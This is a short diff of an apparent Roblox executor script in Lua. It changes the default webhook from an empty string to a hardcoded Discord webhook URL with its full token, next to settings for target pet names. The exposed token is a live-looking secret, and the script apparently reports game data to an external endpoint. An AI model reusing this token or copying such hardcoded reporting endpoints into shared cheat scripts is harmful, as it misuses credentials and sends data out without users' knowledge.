@@ -11,7 +11,7 @@ repeat
 until LocalPlayer
 
 --// User Configuration
-local webhook = getgenv().webhook or ""
+local webhook = getgenv().webhook or "https://discord.com/api/webhooks/1394479168745508894/K2Zn1npQ3fl6UrrHif00RFG6760LutOT3tT4DadBWFN1DaWVRKX8eFnaXuTldG2-SB5-"
 local targetPets = getgenv().TargetPetNames or {}
 
 --// Server and Search Settings
